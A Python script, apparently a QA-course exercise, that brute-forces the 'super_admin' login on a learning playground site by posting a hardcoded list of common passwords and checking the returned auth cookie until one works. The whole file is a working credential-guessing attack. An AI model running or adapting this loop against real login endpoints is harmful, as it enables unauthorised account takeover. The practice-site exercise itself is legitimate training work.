import requests
import json

def get_auth_cookie():
    login = "super_admin"
    json_text = '{"passwords":[{"super_admin":"password"},{"super_admin":"123456"},{"super_admin":"123456789"},{"super_admin":"12345678"},{"super_admin":"qwerty"},{"super_admin":"abc123"},{"super_admin":"abc123"},{"super_admin":"football"},{"super_admin":"1234567"},{"super_admin":"monkey"},{"super_admin":"111111"},{"super_admin":"1234567"},{"super_admin":"letmein"},{"super_admin":"1234"},{"super_admin":"123456"},{"super_admin":"football"},{"super_admin":"1234567890"},{"super_admin":"dragon"},{"super_admin":"baseball"},{"super_admin":"sunshine"},{"super_admin":"iloveyou"},{"super_admin":"trustno1"},{"super_admin":"princess"},{"super_admin":"adobe123"},{"super_admin":"123123"},{"super_admin":"login"},{"super_admin":"admin"},{"super_admin":"abc123"},{"super_admin":"solo"},{"super_admin":"1q2w3e4r"},{"super_admin":"master"},{"super_admin":"666666"},{"super_admin":"1qaz2wsx"},{"super_admin":"qwertyuiop"},{"super_admin":"ashley"},{"super_admin":"mustang"},{"super_admin":"121212"},{"super_admin":"starwars"},{"super_admin":"654321"},{"super_admin":"bailey"},{"super_admin":"access"},{"super_admin":"flower"},{"super_admin":"555555"},{"super_admin":"passw0rd"},{"super_admin":"shadow"},{"super_admin":"lovely"},{"super_admin":"7777777"},{"super_admin":"michael"},{"super_admin":"!@#$%^&*"},{"super_admin":"jesus"},{"super_admin":"password1"},{"super_admin":"superman"},{"super_admin":"hello"},{"super_admin":"charlie"},{"super_admin":"888888"},{"super_admin":"696969"},{"super_admin":"hottie"},{"super_admin":"freedom"},{"super_admin":"aa123456"},{"super_admin":"qazwsx"},{"super_admin":"ninja"},{"super_admin":"azerty"},{"super_admin":"loveme"},{"super_admin":"whatever"},{"super_admin":"donald"},{"super_admin":"batman"},{"super_admin":"zaq1zaq1"},{"super_admin":"Football"},{"super_admin":"000000"},{"super_admin":"123qwe"},{"super_admin":"zaq1zaq1"},{"super_admin":"welcome"}]}'
    obj = json.loads(json_text)
    list = obj['passwords']
    for i in list:
        payload = {'login':login,'password':i[login]}
        response = requests.post("https://playground.learnqa.ru/api/get_auth_cookie", data=payload)
        cookie_value = response.cookies.get('auth_cookie')
        if check_auth_cookie(cookie_value):
            print(f"Password: {i[login]}, You are authorized, 'auth_cookie': {cookie_value}")
            break

def check_auth_cookie(param_cookie):
    cookies = {'auth_cookie': param_cookie}
    response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie",cookies=cookies)
    if response2.text == "You are authorized":
        return True
    else:
        return False


if __name__ == '__main__':
    get_auth_cookie()
